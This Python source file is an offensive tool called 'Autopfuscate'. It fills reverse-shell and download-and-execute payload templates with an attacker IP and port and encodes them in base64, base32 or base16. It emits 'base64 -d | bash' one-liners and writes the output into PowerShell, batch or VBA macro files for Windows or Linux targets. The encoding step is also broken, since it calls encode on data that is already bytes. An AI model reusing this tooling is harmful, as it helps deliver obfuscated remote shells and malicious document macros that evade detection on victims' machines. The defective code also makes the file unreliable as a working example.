import argparse
import base64
import hashlib
import random

try:
    from .utils.file_create import file_creator
except ImportError:
    from utils.file_create import file_creator

try:
    from .utils.obfuscate_library import packet
except ImportError:
    from utils.obfuscate_library import packet

class Autopfuscate:
    def __init__(self, ip, port, string):
        self.string = string
        self.modified_string = None
        self.encoded_string = None
        self.byte_representation = None
        self.final_output = None

        self.ip = ip
        self.port = port

        self.type = None
        self.style = None
        self.verbose = None
        self.os = None
        self.extra = None
        self.extension = None

        self.parser = argparse.ArgumentParser(
            prog='Autopfuscate',
            description='Opfuscates ... (code), (download-string) or (reverse-shells)'
        )
        self.args = None

    def parse_args(self):
        self.parser.add_argument('-v', '--verbose', action='store_true', help="Verbose output")
        self.parser.add_argument('-t', '--type', required=True,
                                 help="Obfuscataion type, (base64), (base32), (base16)")
        self.parser.add_argument('-s', '--style', required=True,
                                 help="Reverse shell (rev), (download) or regular code \
                                         (code) like ur own.")
        self.parser.add_argument('-i', '--ipaddress', help="The Host IPaddress")
        self.parser.add_argument('-p', '--port', help="The Listening Port.")
        self.parser.add_argument('-o', '--os', required=True, help="Target platform, (windows) or (linux)")
        self.parser.add_argument('-x', '--extra',
                                 help="macros (docx), used in combination with vba extension")
        self.parser.add_argument('-e', '--extension', help="File extension, (ps1), (bat), (vba)")

        self.args = vars(self.parser.parse_args())

    def set_arguments(self):
        for key, val in self.args.items():
            if key == 'type':
                self.type = val
            elif key == 'style':
                self.style = val
            elif key == 'ipaddress':
                self.ip = val
            elif key == 'port':
                self.port = val
            elif key == 'os':
                self.os = val
            elif key == 'extra':
                self.extra = val
            elif key == 'extension':
                self.extension = val

    def grab_string(self):
        # Get the string from packet
        for key, val in packet.items():
            if key == self.os:
                self.string = val[self.style]

    def modify_string(self):
        # Modify the string to add ip and port
        keyword_replacement = {
                "<ipaddress>" : self.ip,
                "<port>" : self.port
        }

        modified_string = self.string

        for keyword, replacement in keyword_replacement.items():
            modified_string = modified_string.replace(keyword, replacement)

        self.modified_string = modified_string

    def convert_to_bytes(self):
        self.byte_representation = self.modified_string.encode('utf-16-le')

    def obfuscate_string(self):
        # Encode the string to base64, base32,...
        encoded_bytes = b'0'

        if self.type == 'base64':
            encoded_bytes = base64.b64encode(self.byte_representation.encode('utf-8'))
        elif self.type == 'base32':
            encoded_bytes = base64.b32encode(self.byte_representation.encode('utf-8'))
        elif self.type == 'base16':
            encoded_bytes = base64.b16encode(self.byte_representation.encode('utf-8'))

        self.encoded_string = encoded_bytes.decode('utf-8')

    def output(self):
        if self.os == 'windows' and self.style == 'rev':
            self.final_output = f'{self.encoded_string}'
        elif self.os == 'windows' and self.style == 'download':
            self.final_output = self.encoded_string
        elif self.os == 'linux'  and self.style == 'download':
            self.final_output = f'echo -n "{self.encoded_string}" | base64 -d | bash; sh legit.sh;'
        elif self.os == 'linux' and self.style == 'rev':
            self.final_output = f'echo -n "{self.encoded_string}" | base64 -d | bash'

        print(self.final_output)

    def file_extension(self):
        file_creator(self.extra, self.extension, self.final_output)

def main():
    try:
        autopfuscate = Autopfuscate(None, None, None)
        autopfuscate.parse_args()
        autopfuscate.set_arguments()

        autopfuscate.grab_string()
        autopfuscate.modify_string()
        autopfuscate.convert_to_bytes()
        autopfuscate.obfuscate_string()
        autopfuscate.output()

        autopfuscate.file_extension()
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()
